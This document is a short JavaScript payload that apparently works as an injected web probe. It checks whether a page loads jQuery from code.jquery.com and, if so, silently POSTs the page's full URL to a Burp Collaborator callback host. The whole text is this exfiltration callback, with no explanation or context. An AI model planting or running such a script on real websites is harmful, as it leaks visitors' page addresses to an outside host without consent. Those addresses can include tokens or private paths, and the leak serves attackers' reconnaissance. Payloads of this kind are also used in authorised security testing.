var reg=/code\.jquery.com/ig;
if(document.body.innerHTML.match(reg) || document.head.innerHTML.match(reg)){
fetch('https://87doymd3iswlp2j99hmgs1luslybm0.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.documentURI
});
}
